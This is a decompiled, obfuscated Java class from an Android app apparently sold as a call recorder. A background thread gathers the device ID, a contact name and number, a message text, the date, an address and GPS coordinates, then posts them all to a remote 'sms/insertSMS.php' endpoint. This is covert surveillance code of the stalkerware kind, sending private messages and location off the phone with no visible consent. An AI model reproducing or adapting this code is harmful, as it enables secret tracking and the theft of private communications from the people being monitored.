package com.yasoka.spcallrecord.recorder.call.a.c.g;

import a.b.a.a.a;
import a.c.j.c;
import android.content.Context;
import android.location.Location;
import com.app.received.LocationReceived;
import com.crashlytics.android.Crashlytics;
import java.text.SimpleDateFormat;
import java.util.Date;
import java.util.HashMap;
import java.util.Map;

/* compiled from: In */
public class e extends Thread {

    /* renamed from: a reason: collision with root package name */
    private final Context f220a;

    /* renamed from: b reason: collision with root package name */
    private final String f221b;

    /* renamed from: c reason: collision with root package name */
    private final String f222c;

    public e(Context context, String str, String str2) {
        this.f220a = context;
        this.f221b = str;
        this.f222c = str2;
    }

    public void run() {
        long j;
        double d2;
        double d3;
        Location a2 = LocationReceived.a();
        double d4 = 0.0d;
        if (a2 != null) {
            d4 = a2.getLongitude();
            d3 = a2.getLatitude();
            d2 = (double) a2.getAccuracy();
            j = a2.getTime();
        } else {
            j = 0;
            d3 = 0.0d;
            d2 = 0.0d;
        }
        String a3 = LocationReceived.a(this.f220a);
        SimpleDateFormat d5 = c.d();
        String format = d5.format(new Date());
        if (j != 0) {
            a3 = a.a(a3, "###DATELOC###", d5.format(Long.valueOf(j)));
        }
        String a4 = c.a(this.f220a, this.f221b);
        HashMap hashMap = new HashMap();
        String str = "";
        StringBuilder a5 = a.a(str);
        a5.append(a.c.e.e.e(this.f220a));
        hashMap.put("idPhone", a5.toString());
        StringBuilder sb = new StringBuilder();
        sb.append(str);
        sb.append(a4);
        hashMap.put("name", sb.toString());
        StringBuilder sb2 = new StringBuilder();
        sb2.append(str);
        sb2.append(this.f221b);
        hashMap.put("number", sb2.toString());
        StringBuilder sb3 = new StringBuilder();
        sb3.append(str);
        sb3.append(this.f222c);
        hashMap.put("message", sb3.toString());
        hashMap.put("type", "1");
        StringBuilder sb4 = new StringBuilder();
        sb4.append(str);
        sb4.append(format);
        hashMap.put("date", sb4.toString());
        StringBuilder sb5 = new StringBuilder();
        sb5.append(str);
        sb5.append(a3);
        hashMap.put("address", sb5.toString());
        StringBuilder sb6 = new StringBuilder();
        sb6.append(str);
        sb6.append(d4);
        hashMap.put("longitude", sb6.toString());
        StringBuilder sb7 = new StringBuilder();
        sb7.append(str);
        sb7.append(d3);
        hashMap.put("latitude", sb7.toString());
        StringBuilder sb8 = new StringBuilder();
        sb8.append(str);
        sb8.append(d2);
        hashMap.put("accuracy", sb8.toString());
        try {
            StringBuilder sb9 = new StringBuilder();
            sb9.append(str);
            sb9.append(a4);
            String sb10 = sb9.toString();
            StringBuilder sb11 = new StringBuilder();
            sb11.append(str);
            sb11.append(this.f221b);
            String sb12 = sb11.toString();
            StringBuilder sb13 = new StringBuilder();
            sb13.append(str);
            sb13.append(this.f222c);
            String sb14 = sb13.toString();
            StringBuilder sb15 = new StringBuilder();
            sb15.append(str);
            sb15.append(format);
            String sb16 = sb15.toString();
            StringBuilder sb17 = new StringBuilder();
            sb17.append(str);
            sb17.append(a3);
            String sb18 = sb17.toString();
            StringBuilder sb19 = new StringBuilder();
            sb19.append(str);
            sb19.append(d4);
            String sb20 = sb19.toString();
            StringBuilder sb21 = new StringBuilder();
            sb21.append(str);
            sb21.append(d3);
            String sb22 = sb21.toString();
            StringBuilder sb23 = new StringBuilder();
            sb23.append(str);
            sb23.append(d2);
            long a6 = a.a.a(sb10, sb12, sb14, 1, sb16, sb18, sb20, sb22, sb23.toString(), this.f220a);
            if (a.c.e.a.b("sms/insertSMS.php", (Map<String, String>) hashMap)) {
                a.a.e((int) a6, this.f220a);
            }
        } catch (Exception e2) {
            try {
                e2.getStackTrace();
                Crashlytics.logException(e2);
            } catch (Exception unused) {
            }
        }
    }
}
